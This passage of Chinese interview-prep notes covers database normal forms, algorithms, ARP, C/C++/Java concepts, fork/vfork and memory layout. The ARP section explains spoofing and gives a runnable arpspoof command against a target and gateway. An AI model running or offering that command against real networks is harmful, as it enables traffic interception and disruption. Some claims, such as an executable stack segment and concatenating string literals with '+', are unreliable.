  （仓库名，物品名）-> 管理员。这个属于部分函数依赖（因为仓库名->管理员）
  ```

  

* **4NF**

  角度一：消除非平凡且非函数依赖的多值依赖

  角度二：A table is in 4NF if and only if, for every one of its non-trivial multivalued dependencies X ->-> Y, X is a superkey—that is, X is either a candidate key or a superset thereof. X->->Y是非平凡函数依赖的，且X是一个候选码或者他的超集。

* **5NF**

  角度一：消除不是由候选码所蕴含的连接依赖

  角度二：Fifth normal form (5NF), also known as project-join normal form (PJ/NF), is a level of database normalization designed to reduce redundancy in relational databases recording multi-valued facts by isolating semantically related multiple relationships. A table is said to be in the 5NF if and only if every non-trivial join dependency in that table is implied by the candidate keys.

<u>相关问题：</u>

**数据库三大范式是什么？**

1NF、2NF、3NF

#### 6.（数据结构）动态规划和贪心算法的区别？（18年面试官提问）

* 贪心算法：

  对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，他所做出的是在某种意义上的<u>局部最优解</u>。

* 动态规划：

  把复杂的问题简化成规模较小的子问题，再从简单的子问题自底向上一步一步递推。

#### 7.（数据结构）1-1000中少一个数，怎样找出他？（09年面试官提问）

O(n)求和得到s，然后求出不缺这个数的和m，用m减s

O(nlogn)排序，从头查找

* 变种：连续的数(a~b)之间缺两个数，怎么找出来若数据有序

  如果数字比较小，可以用桶排序，空间：O（n）时间：O（n）

  设少了x,y,也可以先求和得到s，再求和得到m，我们可以算出

  $$
x+y=\sum_{i=a}^{b}i-s
  \\
x^2+y^2 = \sum_{i=a}^{b}i^2-m
  $$
  解这个方程组即可,注意到两个sum都可以用公式求。



#### 8.（数据结构）prim和kruskal的区别？（多年面试官提问）

* **Prim:** 
  * 输入：一个加权连通图，其中顶点集合为V，边集合为E；
  * 初始化：Vnew = {x}，其中x为集合V中的任一节点（起始点），Enew = {},为空；
  * 重复下列操作，直到Vnew = V：
    * 在集合E中选取权值最小的边<u, v>，其中u为集合Vnew中的元素，而v不在Vnew集合当中，并且v∈V（如果存在有多条满足前述条件即具有相同权值的边，则可任意选取其中之一）；
    * 将v加入集合Vnew中，将<u, v>边加入集合Enew中；
  * 输出：使用集合Vnew和Enew来描述所得到的最小生成树。
* **Kruskal：**
  * 从网的边集 E 中选取一条权值最小的边，若该条边的两个顶点分属不同的树，则将其加入子图，即把两棵树合成一棵树，反之，若该条边的两个顶点已落在同一棵树上，则不可取，而应该取下一条权值最小的边再试之



#### 9.（数据结构）如何不用存储空间交换两个数？（10年面试官提问）

```c
#include <stdio.h>
int main(){
    int a = 3;
    int b = 5;
    a = a ^ b;
    b = a ^ b;
    a = a ^ b; 
    printf("%d,%d\n",a,b);
    return 0;
}
```

也可（有溢出风险）

```c
#include <stdio.h>
int main()
{
   int a = 3;
   int b = 5;
   a = a + b;
   b = a - b;
   a = a - b;
   printf("%d,%d\n",a,b);
   return 0;
}
```

#### 10.（信息安全）对信息安全的总的看法，分哪几块？（09年面试官提问/结合现在的技术）

大数据安全

区块链

5G

隐私安全

传统网站安全

传统软件安全

人工智能、人脸识别、自动驾驶

#### 11.（信息安全）ARP的全称，ARP攻击是什么（09年面试官提问/华为面试）

ARP（Address Resolution Protocol，地址解析协议）是根据IP地址获取物理地址MAC的一个TCP/IP协议

运行在网络层。

* ARP请求采用广播方式，应答采用单播方式

* 工作过程：

  ①主机A发出广播报文，询问主机B的IP地址与MAC地址的映射关系；

  ②所有主机都接收到这个请求；

  ③主机B识别请求信息，向主机A发送响应报文，回答主机B的IP地址与物理地址的映射关系：

  ④主机A得到映射信息。

* 实现ARP欺骗：

  * 核心思想:

    向目标主机发送伪造的ARP应答，并使目标主机接收应答中伪造的IP地址与MAC地址之间的映射对，以此更新目标主机ARP缓存

  * 攻击者可以发送伪造的信息给局域网中受害主机，该信息中包含局域网网关的IP地址和主机的MAC地址（直白的说，就是告诉受害主机，我才是网关，你要发数据就发给我吧）。

* 如何预防？

  ip-mac静态绑定

* 实战

  在家里的局域网就可以完成实验。

  `https://github.com/byt3bl33d3r/arpspoof`

  命令：

  `sudo python arpspoof.py -i en0 -t target-ip gateway-ip`

  如果目标ip(比如自己的手机)断网了，你就成功了



## 4、站在巨人的肩膀上

> 主体内容源自09/10年的王道论坛和天勤论坛，我在这基础上加入了更多难点、代码实现和校招面试中常见的问题，希望能有帮助，时代在变，学技术的心不变❤️

### 一、面向对象程序设计(C++/JAVA)&C语言

#### 1、多态和动态链接的区别

**多态**（Polymorphism）

* 按字面的意思就是“多种形状”。多态性是允许你将父对象设置成为和一个或更多的他的子对象相等的技术，赋值之后，父对象就可以根据当前赋值给它的子对象的特性以不同的方式运作。简单的说，就是一句话：允许将子类类型的指针赋值给父类类型的指针

**动态链接库**（Dynamic Link Library，缩写为 DLL）

* 是一个可以被其它应用程序共享的程序模块，其中封装了一些可以被共享的例程和资源。动态链接库文件与可执行文件（exe）非常类似，区别在于 DLL 中虽然包含了可执行代码却不能单独执行，而应由 Windows 应用程序直接或间接调用。  动态链接是相对于静态链接而言的。所谓静态链接是指把要调用的函数或者过程链接到可执行文件中，成为可执行文件的一部分。换句话说，函数和过程的代码就在程序的 exe 文件中，该文件包含了运行时所需的全部代码。当多个程序都调用相同函数时，内存中就会存在这个函数的多个拷贝， 这样就浪费了宝贵的内存资源。而动态链接所调用的函数代码并没有被拷贝到应用程序的可执行文件中去，而是仅仅在其中加入了所调用函数的描述信息（往往是一些重定位信息）。仅当应用程序被装入内存开始运行时，在 Windows 的管理下，才在应用程序与相应的 DLL 之间建立链接关系。当要执行所调用 DLL 中的函数时，根据链接产生的重定位信息，Windows 才转去执行 DLL 中相应的函数代码。

#### 2、解释面向对象里面的动态绑定

在面向对象语言中，可以从一个类派生出另一个类。派生出其它类的类称为基类， 又称为父类。被派生的类称为派生类，又称为子类。派生类可以具有父类的特性，共享父类的成员函数，使用父类的成员，还可以定义自己的新特性，定义自己的数据成员和成员函数。一个派生类可以从一个基类派生，也可以从多个基类派生。从一个基类派生的继承称为单继承；从多个基类派生的继承称为多继承。

继承方式主要表示派生类继承基类时采用的继承方式，主要有三种，即公有继承、私有继承、保护继承

动态绑定:如果一个基类含有虚函数，那么在编译时，编译器会生成一张虚函数表，表里是该类中所有虚函数的地址(按出现顺序排列)；并且会在该类中动态的插入一个成员变量( vfptr)，它是一个指向这个虚函数表的指针。对于这个基类的所有子类，编译器都会生成各自的虚函数表，并且把继承得来的 vfptr 指针指向它。

静态绑定可以理解为在编译时知道了对象名,那么此时就可以访问相应的虚函数;而动态绑定因为是用一个基类的指针来代表,不到运行的时候程序并不知道这个指针是指向基类还是指向派生类,那么虚函数也就不确定了 

#### 3、JVM虚拟机

> 插播一则讯息：往年有同学把这认为是vmware这种虚拟机软件，说什么可以用来账号多开，若真的这么问了，回答时先询问一下，以免笑场。

原问题：虚拟机的好处、坏处、种类、最快的虚拟机

原答案：好处：虚拟机有很好的性能，有很好的可移植性。有利于测试，安全。坏处：低效率

种类：有 JVM，SableVM，IBM 的 VM

最快的虚拟机：JRockit （蛮古老的，了解一下即可,传言其垃圾收集算法是最好的）

* JVM（Java Virtual Machine）JVM是一种用于计算设备的规范，它是一个虚构出来的计算机，是通过在实际的计算机上仿真模拟各种计算机功能来实现的。Java虚拟机包括一套字节码指令集、一组寄存器、一个栈、一个垃圾回收堆和一个存储方法域。 JVM屏蔽了与具体操作系统平台相关的信息，使Java程序只需生成在Java虚拟机上运行的目标代码（字节码）,就可以在多种平台上不加修改地运行。JVM在执行字节码时，实际上最终还是把字节码解释成具体平台上的机器指令执行。
* Java语言的一个非常重要的特点就是与平台的无关性。而使用Java虚拟机是实现这一特点的关键。一般的高级语言如果要在不同的平台上运行，至少需要编译成不同的目标代码。而引入Java语言虚拟机后，Java语言在不同平台上运行时不需要重新编译。Java语言使用Java虚拟机屏蔽了与具体平台相关的信息，使得Java语言编译程序只需生成在Java虚拟机上运行的目标代码（字节码），就可以在多种平台上不加修改地运行。Java虚拟机在执行字节码时，把字节码解释成具体平台上的机器指令执行。这就是Java的能够“一次编译，到处运行”的原因。



#### 4、什么是虚表

虚表：虚表是一个指针数组，其元素是虚函数的指针，每个元素对应一个虚函数的函数指针。需要指出的是，普通的函数即非虚函数，其调用并不需要经过虚表，所以虚表的元素并不包括普通函数的函数指针。 
虚表内的条目，即虚函数指针的赋值发生在编译器的编译阶段，也就是说在代码的编译阶段，虚表就可以构造出来了。

```c++
class A {
public:
    virtual void vfunc1();
    virtual void vfunc2();
    void func1();
    void func2();
private:
    int m_data1, m_data2;
};

```

虚表是属于类的，而不是属于某个具体的对象，一个类只需要一个虚表即可。同一个类的所有对象都使用同一个虚表。 
为了指定对象的虚表，对象内部包含一个虚表的指针，来指向自己所使用的虚表。为了让每个包含虚表的类的对象都拥有一个虚表指针，编译器在类中添加了一个指针__vptr，用来指向虚表。这样，当类的对象在创建时便拥有了这个指针，且这个指针的值会自动被设置为指向类的虚表。

![image-20200306002122363](/Users/godspeed/Library/Application Support/typora-user-images/image-20200306002122363.png)



#### 5、C++异常处理机制

抛出异常和捕捉异常;

c++的异常处理机制使得异常的引发和处理不必在同一函数中，这样低层的函数可以着重解决具体问题，而不必过多的考虑对异常的处理，上层调用者可以在适当的位置设有对不同类型异常的处理

```c++
#include <iostream>
using namespace std;
int main()
{
    double m ,n;
    cin >> m >> n;
    try {
        cout << "before dividing." << endl;
        if( n == 0)
            throw -1; //抛出int类型异常
        else
            cout << m / n << endl;
        cout << "after dividing." << endl;
    }
    catch(int e) {
        cout << "catch(int) " << e << endl;
    }
    cout << "finished" << endl;
    return 0;
}

111 0
before dividing.
catch(int) -1
finished
```



#### 6、C/C++的区别

* 设计思想上:
   C++是面向对象的语言，而 C 是面向过程的结构化编程语言 

* 语法上:
  * C++具有封装、继承和多态三种特性
  * C++相比 C，增加多许多类型安全的功能，比如强制类型转换
  * C++支持泛型编程，比如模板类、函数模板等

【相似问题】

* C++/JAVA的区别
  * C++容易出现内存泄露，需要手动回收内存。而 JAVA 有垃圾自动回收机制
  * C++里面有指针，JAVA 里面没有
  * JAVA 的可移植性更好，JAVA 的类文件能够在不同的平台上使用。而 C++在windows 下生成的可执行文件在 LINUX 下无法运行，需要重新编译。JAVA 生成的类可以认为是中间代码，java 文件在 JAVA 虚拟机上运行，通过虚拟机来产生最终代码，linux 和 java 下都会有虚拟机。而 C++编译器生成的是最终代码，有些系统调用在不同的系统下并不能够成功进行
  * JAVA 是纯面向对象，而 C++是基于对象的。在 JAVA 里出现最多的就是类

#### 7、虚函数相关问题

> 务必动手实践

问法：虚函数有什么作用？子类重写父类的普通函数和子类重写父类的虚函数的区别？

* 虚函数的作用：实现多态性（Polymorphism）。允许在派生类中重新定义与基类同名的函数，并且可以通过基类指针或引用来访问基类和派生类中的同名函数。
* 区别：若不是虚函数，则不管基类指针指向的哪个派生类对象，调用时都会调用基类中定义的那个函数

```c++
#include <bits/stdc++.h>
using namespace std;
class fa
{
public:
	virtual void print(){
		printf("father print\n");
	}
	
};
class son: public fa
{
public:
	void print(){
		printf("son print\n");
	}
	
};
int main(){
	fa *f = new son;
	f->print();
	return 0;
}

son print


如果我们去掉virtual，这就变成了子类重写普通函数，打印出”father print“
```



* 纯虚函数

  * 是一种特殊的虚函数。
  * 纯虚函数就是没有函数体，同时在定义的时候，其函数名后面要加上“= 0”
  * 在许多情况下，在基类中不能对虚函数给出有意义的实现，而把它说明为纯虚函数，它的实现留给该基类的派生类去做。这就是纯虚函数的作用。

  此外，我们把包含纯虚函数的类称之为<u>抽象类</u>

  对于抽象类的子类来说，只有把抽象类中的纯虚函数全部实现之后，那么这个子类才可以实例化对象。

  ```c++
  #include <bits/stdc++.h>
  using namespace std;
  class fa
  {
  public:
  	fa(){}
  	virtual void print()=0;
  };
  
  class son: public fa
  {
  public:
  	son(){}
  	void print(){
  		printf("son print\n");
  	}
  };
  int main(){
  	fa *f = new son;
    //对于抽象类来说，C++是不允许它去实例化对象的。也就是说，抽象类无法实例化对象
    //比如fa *f = new fa;会报错
  	f->print();
  	return 0;
  }
  
  son print
  ```

  

* 纯虚析构函数

  * 纯虚析构函数和普通纯虚函数的区别在于，纯虚析构函数需要提供函数的实现，而一般纯虚函数不能有实现，这样的原因在于，纯虚析构函数最终需要被调用，以析构基类对象；如果不提供该析构函数的实现，将使得在析构过程中，析构无法完成而导致析构异常的问题。
  * <u>必须为基类的纯虚析构函数提供一个定义</u>，否则，链接器会发出抱怨

  ```c++
  #include <bits/stdc++.h>
  using namespace std;
  class fa
  {
  public:
  	fa(){}
  	virtual ~fa()=0;
  	
  };
  fa::~fa(){
  	printf("father deconstructed function called\n");
  }
  class son: public fa
  {
  public:
  	son(){}
  	~son(){
  		printf("son deconstructed function called\n");
  	}
  };
  int main(){
  	fa *f = new son;
  	delete(f);
  	return 0;
  }
  
  son deconstructed function called
  father deconstructed function called
  ```

  

#### 8、C++类中不定义虚函数和定义了虚函数的类在初始化的时候大小是不是一样

不一样，定义了虚函数要大一些，因为要建立虚函数表

#### 9、什么是内存泄露？

内存泄漏指由于疏忽或错误造成程序未能释放已经不再使用的内存的情况。内存泄漏并非指内存在物理上的消失，而是应用程序分配某段内存后，由于设计错误，失去了对该段内存的控制，因而造成了内存的浪费

#### 10、Java 怎么处理对象的分配和释放问题

Java 把内存划分成两种：一种是栈内存，一种是堆内存

在函数中定义的一些基本类型的变量和对象的引用变量都在函数的栈内存中分配。当在

一段代码块定义一个变量时，Java 就在栈中为这个变量分配内存空间，当超过变量的作用域后，Java 会自动释放掉为该变量所分配的内存空间，该内存空间可以立即被另作他用。堆内存用来存放由 new 创建的对象和数组。在堆中分配的内存， 由 Java 虚拟机的自动垃圾回收器来管理。在堆中产生了一个数组或对象后，还可以在栈中定义一个特殊的变量，让栈中这个变量的取值等于数组或对象在堆内存中的首地址，栈中的这个变量就成了数组或对象的引用变量。引用变量就相当于是为数组或对象起的一个名称，以后就可以在程序中使用栈中的引用变量来访问堆中的数组或对象。引用变量为0时表示不再使用,释放.

#### 11、Java 垃圾收购机制?

垃圾回收是一种动态存储管理技术，它自动地释放不再被程序引用的对象（即释放其所占用的内存），按照特定的垃圾收集算法来实现资源自动回收的功能。在 C++中，需要程序员自己调用 delete 或析构函数来回收内存。

【深入问题】C程序内存不够怎么办？

可以先静态分析程序，看有没有大量malloc申请内存的语句，其次可以断点调试，动态分析程序运行情况，如果上述分析情况良好，说明程序本身要求内存大小比较大，要优化算法，最后才考虑物理性增加内存。

#### 12、多线程编程应注意什么

* 线程中如果用到公共资源，一定要考虑公共资源的线程安全性。一般用LOCK锁机制来控制线程安全性。避免死锁
* 防止栈溢出



JAVA多线程代码示例:

方法一： 继承 Thread 类

```java
class MyThread extends Thread{
	int j=20;
	public void run(){
		for (int i = 0; i < 20; i++) {
			try {
				Thread.sleep(100);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			System.out.println(this.getName()+",i="+j--);
		}
	}
}


public static void main(String[] args) {
	// 使用这个方法启动一个线程
	new MyThread().start();
}
```

方法二：实现  Runnable 接口

```java
class MyRunnable implements Runnable{
	int j=20;
	@Override
	public void run() {
		for (int i = 0; i < 20; i++) {
			System.out.println(Thread.currentThread().getName()+",j="+this.j--);
		}
	}	
}

public static void main(String[] args){
	  MyRunnable myRunnable = new MyRunnable();
		Thread t1 = new Thread(myRunnable);
		Thread t2 = new Thread(myRunnable);
		t1.start();
		t2.start();
}
```



#### 13、面向对象的特点

* **封装**
  * 定义：封装就是将抽象得到的数据和行为相结合，形成一个有机的整体，也就是将数据与操作数据的源代码进行有机的结合，形成类，其中数据和函数都是类的成员，目的在于将对象的使用者和设计者分开
  * 目的：提高软件的可维护性和可修改性
  * 特性：
    * 结合性，即是将属性和方法结合   
    * 信息隐蔽性，利用接口机制隐蔽内部实现细节，只留下接口给外界调用   
    * 实现代码重用
* **继承**  
  * 定义：继承就是新类从已有类那里得到已有的特性。 类的派生指的是从已有类产生新类的过程。原有的类成为基类或父类，产生的新类称为派生类或子类，子类继承基类后，可以创建子类对象来调用基类函数，变量等
* **多态**
  * 定义：可以简单概括为“一个接口，多种方法”，即用的是同一个接口，但是效果各不相同，多态有两种形式的多态，一种是静态多态，一种是动态多态
  * **动态多态：**  是指在程序运行时才能确定函数和实现的链接，此时才能确定调用哪个函数，父类指针或者引用能够指向子类对象，调用子类的函数，所以在编译时是无法确定调用哪个函数
  * **静态多态：**是在编译期就把函数链接起来，此时即可确定调用哪个函数或模板，静态多态是由模板和重载实现的，在宏多态中，是通过定义变量，编译时直接把变量替换，实现宏多态

#### 14、JAVA并发的原理

线程通信、dameon守护线程、线程状态、安全终止线程

#### 15、C++和 C 字符串的区别

* 类型上
  * C 字符串是基本数据类型，即字符数组；
  * C++字符串是类 

* 使用上

  * C 字符串函数是外部函数，字符串作为参数被传进来，进而对其进行操作；`strlen(s)`

  * C++字符串函数是字符串类内部定义的，可以用‘.’来直接使用        
  * C++字符串里面对一些运算符进行了重载，比如==，=，＜，＞等`"aa"+"bb"="aabb"`

#### 16、友元函数有没有参数

* 友元函数没有this指针，则参数要有三种情况： 
  * 要访问非static成员时，需要对象做参数；
  * 要访问static成员或全局变量时，则不需要对象做参数；
  * 如果做参数的对象是全局对象，则不需要对象做参数.

* 友元函数是不能被继承的，就像父亲的朋友未必是儿子的朋友

* 友元类

  在这种情况下，整个类及其所有成员都是友元。

* 友元函数

  原型在类的定义中出现过，但是友元函数并不是成员函数。类的友元函数是定义在类外部，但有权访问类的所有私有（private）成员、保护（protected）成员、公有（public）成员。

```c++
#include <iostream>
using namespace std;
class Box
{
    double width;
public:
    friend void printWidth(Box box);
    friend class BigBox;
    void setWidth(double wid);
};
class BigBox
{
public :
    void Print(int width, Box &box)
    {
        // BigBox是Box的友元类，它可以直接访问Box类的任何成员
        box.setWidth(width);
        cout << "Width of box : " << box.width << endl;
    }
};
// 成员函数定义
void Box::setWidth(double wid)
{
    width = wid;
}
// 请注意：printWidth() 不是任何类的成员函数
void printWidth(Box box)
{
    /* 因为 printWidth() 是 Box 的友元，它可以直接访问该类的任何成员 */
    cout << "Width of box : " << box.width << endl;
}
// 程序的主函数
int main()
{
    Box box;
    BigBox big;
    // 使用成员函数设置宽度
    box.setWidth(10.0);
    // 使用友元函数输出宽度
    printWidth(box);
    // 使用友元类中的方法设置宽度
    big.Print(20, box);
    getchar();
    return 0;
} 
```

#### 17.头文件有.h和没有.h

.h的是标准C的头文件，没有.h的是标准C++的头文件，两种都是头文件。

`#include <iostream>`

新的C++标准把标准库中的名字都放入了std名字空间，因此在include之后，还必须使用标准库的名字空间std

`#include <stdio.h>`

新的C++标准库为了统一以前的C标准库，将原来c的标准库也放入了std名字空间

`#include <cstdio>`

#### 18.输入输出如果没有参数会怎么样

来看这样一个例子，输出如果没有参数，会打印出一个内存里的值。

```c++
#include <bits/stdc++.h>
using namespace std;
int main(){
	printf("%x\n");
	return 0;
}

e338eba0
```

输入如果没有参数(需要调试，理论上会接受一个内存里的值)

```c++
#include <bits/stdc++.h>
using namespace std;
int main(){
	scanf("%d");
	return 0;
}
```



#### 19.请解释为什么析构函数要是虚函数？为什么C++默认的析构函数不是虚函数？

* 第一问：在C++中，基类指针可以指向一个派生类的对象。如果基类的析构函数不是虚函数，当需要delete这个指向派生类的基类指针时，就只会调用基类的析构函数，而派生类的析构函数无法被调用。容易造成内存泄漏。
* 第二问：虚函数需要额外的虚函数表和虚表指针，占用额外的内存。而对于不会被继承的类来说，其析构函数如果是虚函数，就会浪费内存。因此 C++默认的析构函数不是虚函数，而是只有当需要当作父类时，设置为虚函数。

> 我们来看一下例子加深一下理解，务必自己敲一下代码加深理解！

```c++
#include <bits/stdc++.h>
using namespace std;
class fa
{
public:
	fa(){
		cout<<"class fa constructed function called!"<<endl;
	
	}
	virtual ~fa(){
		cout<<"class fa destructed function called!"<<endl;
	}
	
};
class son: public fa
{
public:
	son(){
		cout<<"class son constructed function called!"<<endl;
	}
	~son(){
		cout<<"class son destructed function called!"<<endl;
	}
};
int main(){
	fa *f = new fa;
	cout<<"------------------------------"<<endl;
	f = new son;
	delete(f);
	return 0;
}


/*
class fa constructed function called!
------------------------------
class fa constructed function called!
class son constructed function called!
class son destructed function called!
class fa destructed function called!
*/

假如我们去掉父类中的virtual，输出如下
/*
class fa constructed function called!
------------------------------
class fa constructed function called!
class son constructed function called!
class fa destructed function called!
*/
```

#### 20、什么是函数指针？

如果在程序中定义了一个函数，那么在编译时系统就会为这个函数代码分配一段存储空间，这段存储空间的首地址称为这个函数的地址。而且函数名表示的就是这个地址。既然是地址我们就可以定义一个指针变量来存放，这个指针变量就叫作函数指针变量，简称函数指针。

```cpp
#include <bits/stdc++.h>
using namespace std;
int func(int a,int b){
	return a+b;
}
int (*p)(int a,int b);
int main(int argc, char const *argv[])
{
	p = func;
	cout<<p(2,3)<<endl;
	return 0;
}
```

#### 21、指针、数组指针、指针数组的区别

* **指针数组**

  类比整形（int）数组、单精度浮点型（float）数组

  二级指针，数组元素的类型为指针
  定义方式

```c
char* color[5]={"red","blue","green","yellow","black"};
printf("%s",color[1]);//方括号里可以为01234，本行打印出blue
```

* **数组指针**

  是指向一个数组首地址的指针，它实际上也是一种指针类型，类似于函数指针。它声明如下

  ```c
  int iArr[2][3]={0,1,2,3,4,5};
  int (*pArr)[3]=iArr;//声明数组指针，指向一个数组,他的数组元素为int，元素的个数=3
  //访问，以下两种方式都访问了同一个变量
  *(*(pArr+1) + 2)
  *(*(iArr+1) + 2)
  ```

* **指针**

  存放一个变量的地址



#### 22、jump table是什么，有什么优点？

分支表或跳转表是一种使用分支或跳转指令表将程序控制转移到程序的另一部分（或可能已动态加载的其他程序）的方法。它是多路分支的一种形式。分支表构造通常在用汇编语言进行编程时使用，也可以由编译器生成，尤其是在优化将值密集封装在一起的switch语句时。

```c
#include <stdio.h>
int func(){
	int x = 0x1;
	int res = 0;
	switch(x){
		case 0x3:{
			res += 0x1;
			break;
		}
		case 0x4:{
			res += 0x2;
			break;
		}
		case 0x5:{
			res += 0x3;
			break;
		}
		case 0x6:{
			res += 0x4;
			break;
		}
		case 0x7:{
			res += 0x5;
			break;
		}
		case 0x8:{
			res += 0x6;
			break;
		}
	}
	return res;
}
int main(int argc, char const *argv[])
{
	func();
	return 0;
}
```

`gcc -S test.c` 查看汇编代码

```c
为了方便理解在ubuntu32bit下编译 64位看不懂

func:
.LFB0:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register 5
	subl	$16, %esp
	movl	$1, -4(%ebp)//x=1
	movl	$0, -8(%ebp)
	cmpl	$6, -4(%ebp)//x==6?
	ja	.L2 //jmp above大于6跳转
	movl	-4(%ebp), %eax //eax=x
	sall	$2, %eax //eax = eax<<2
	addl	$.L4, %eax //eax = eax + L4_addr = 4+L4_addr
	movl	(%eax), %eax //取出地址（即L3的地址）
	jmp	*%eax //跳到L3
	.section	.rodata
	.align 4
	.align 4
.L4:
	.long	.L2
	.long	.L3
	.long	.L5
	.long	.L6
	.long	.L7
	.long	.L8
	.long	.L9
	.text
.L3://case 1
	addl	$1, -8(%ebp)
	jmp	.L2
.L5://case 2
	addl	$2, -8(%ebp)
	jmp	.L2
.L6://case 3
	addl	$3, -8(%ebp)
	jmp	.L2
.L7://case 4
	addl	$4, -8(%ebp)
	jmp	.L2
.L8://case 5
	addl	$5, -8(%ebp)
	jmp	.L2
.L9://case 6
	addl	$6, -8(%ebp)
	nop
.L2:
	movl	-8(%ebp), %eax
	leave
```

我们发现编译器生成了一些很有规律的表，它的每一项都是一个标号，而这个标号，恰恰是每个 case 语句的入口标号

#### 23、举例python的可变对象和不可变对象

* 可变对象：list,dict
* 不可变对象有:int,string,float,tuple.

#### 24、python和C有什么区别

* C 属**编译型**语言，Python 属**解释型**语言
* C 更偏向底层，抽象和语法糖更少，使用起来不如 Python 方便。但 C 更简单，如果有计算机体系的知识，精通起来比 Python 可能更容易。
* C 的语法不如 Python 简洁。
* C 需要自己维护堆内存，Python 有垃圾回收机制。
* C 的跨平台性不如 python

#### 25、fork和vfork

> 了解即可

* 功能都是创建一个进程
* fork 子进程拷贝父进程的<u>数据段，代码段</u>
  vfork 子进程与父进程共享数据段
* fork 父子进程的执行次序不确定
* vfork 保证子进程先运行，在调用exec 或exit 之前与父进程数据是共享的,在它调用exec或exit 之后父进程才可能被调度运行。
  调用这两个函数之前子进程依赖于父进程的进一步动作，则会导致死锁。

##### fork()

The fork operation creates a separate address space for the child. The child process has an exact copy of all the memory segments of the parent process.

来看一个子进程拷贝父进程代码段和数据段的例子

```c
#include<sys/types.h>
#include<unistd.h>
#include<stdio.h>
 
int main()
{
    pid_t pid;
    int cnt = 0;
    pid = fork();
    if(pid<0)
        printf("error in fork!\n");
    else if(pid == 0){//子进程的pid=0
    		cnt += 10;
        printf("I am the child process,ID is %d, cnt = %d\n",getpid(),cnt);
    }
    else {//父进程返回子进程的进程号
    		cnt += 10;
    		printf("%d\n",pid );//创建的子进程的进程号 (>0)
        printf("I am the parent process,ID is %d, cnt = %d\n",getpid(),cnt);
    }
  
    return 0;
}

27832
I am the parent process,ID is 27831, cnt = 10
I am the child process,ID is 27832, cnt = 10
```

我们知道fork()函数子进程是拷贝父进程的代码段的，所以子进程中同样有那一堆if-else,这堆代码会被父进程和子进程各执行一次，最终由于子进程的pid=0,而打印出第一句话，父进程的pid>0，而打印出第二句话。于是得到了上面的运行结果。

同时我们注意到了cnt的值，因为子进程同样拷贝了数据段，即cnt=0

##### vfork()

When a vfork system call is issued, the parent process will be suspended until the child process has either completed execution or been replaced with a new executable image via one of the "exec" family of system calls.

父子进程共享地址空间

```c
#include<sys/types.h>
#include<unistd.h>
#include<stdio.h>
int main()
{
    pid_t pid;
    int cnt = 0;
    pid = vfork();
    if(pid<0)
        printf("error in fork!\n");
    else if(pid == 0){//子进程的pid=0
    	cnt += 10;
        printf("I am the child process,ID is %d, cnt = %d\n",getpid(),cnt);
        _exit(0);//子进程及时退出
    }
    else {//父进程返回子进程的进程号
    	cnt += 10;
    	printf("%d\n",pid );//创建的子进程的进程号 (>0)
        printf("I am the parent process,ID is %d, cnt = %d\n",getpid(),cnt);
    }
    return 0;
}

I am the child process,ID is 28034, cnt = 10
28034
I am the parent process,ID is 28033, cnt = 20
```

#### 26、C语言中静态数据分配在哪里？

* 静态存储区

  内存在程序编译的时候就已经分配好，这块内存在程序的整个运行期间都存在。它主要存放静态数据、全局数据和常量。

  ```
  static int x = 101;
  ```

* 栈区

  在执行函数时，函数内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放。栈内存分配运算内置于处理器的指令集中，效率很高，但是分配的内存容量有限。

  ```c
  void func(){
  	int x = 10;
  	return;
  }
  ```

* 堆区

  亦称动态内存分配。程序在运行的时候用malloc或new申请任意大小的内存，程序员自己负责在适当的时候用free或delete释放内存。动态内存的生存期可以由我们决定，如果我们不释放内存，程序将在最后才释放掉动态内存。 但是，良好的编程习惯是：如果某动态内存不再使用，需要将其释放掉，否则，我们认为发生了内存泄漏现象。

  ```c
  #include<stdio.h>
  #include<stdlib.h>
  int main()
  {
      int *p = (int *)malloc(sizeof(int));
      *p=5;
      printf("%d\n",*p );
      return 0;
  }
  ```

  

#### 27、C++的内存管理是怎么样的？

![image-20200313235906281](/Users/godspeed/Library/Application Support/typora-user-images/image-20200313235906281.png)

* 栈(Stack)

  使用栈空间存储函数的返回地址、参数、局部变量、返回值

* 映射区(Memory Mapping Segment)

  存储动态链接库以及调用 mmap 函数进行的文件映射

* 堆区(Heap)

  调用new/malloc函数时在堆区动态分配内存，同时需要调用delete/free来手动释放申请的内存。

* BSS 段

  存储未初始化的全局变量和静态变量(局部+全局)，以及所有被初始化为 0 的全局变量和静态变量，对于未初始化的全局变量和静态变量，程序运行 main 之前时会统一清零。即未初始化的全局变量编译器会初始化为 0

* 数据段（Data Segment）

  存储程序中已初始化的全局变量和静态变量

* 代码段(Text Segment)

  包括只读存储区和文本区，其中只读存储区存储字符串常量，文本区存储程序的机器代码。

<u>相关问题</u>

**代码段和数据段有什么区别？（趋势科技面试）**

代码段里面有可执行代码——段属性为可读可执行不可写
数据段里面有全局变量和静态变量等——段属性为可读可写不可执行
堆栈段里面有返回地址和局部变量等——段属性为可读可写可执行



#### 28、struct与class的区别

总的来说，C++中struct和class极其相似，比如，struct能包含成员函数、能继承、能实现多态等。但是二者之间也存在着不可忽视的区别，如下：

* 默认的继承访问权限不同。struct默认是public继承，class默认是private继承。

  ```c++
  #include <bits/stdc++.h>
  using namespace std;
  struct Base{
  	int num1;
  };
  struct Derived:Base{
  	int num2;
  };
  int main(){
  	Derived d;
  	d.num1 = 1;
  	return 0;
  }
  ```

  

* class这个关键字还可用于定义模板参数,但是strcut不用于定义模板参数

  ```c++
  template< typename T, typename Y >	//可以把typename 换成 class
  int  Func( const T& t, const Y& y )
  {
  	//TODO
  }
  ```

* class默认的成员访问权限是private的，而struct默认是public的

  ```c++
  #include <bits/stdc++.h>
  using namespace std;
  class Base{
  	int num1;
  };
  int main(){
  	Base a;
  	a.num1 = 1;	//在struct情况下是正确的，在class情况下是错误的
  	// error: 'int Base::num1' is private within this context
  	return 0;
  }
  ```

#### 29、C++的模版？

* 函数模版

  函数模板：函数模板的重点是模板。表示的是一个模板，专门用来生产函数。

  ```c++
  #include <bits/stdc++.h>
  using namespace std;
  template<typename T>
  bool IsEqual(const T& left, const T& right ) {
  	return left == right;
  }
  int main(){
  	string s1 = "a";
  	string s2 = "b";
  	cout << IsEqual(s1, s2) << endl;
  	cout << IsEqual(1, 1) << endl;	
  	cout << IsEqual(1, 10.11) << endl;//会报错，参数不匹配
  	cout << IsEqual<int>(1, 10.11) << endl;	
  	return 0;
  }
  
  0
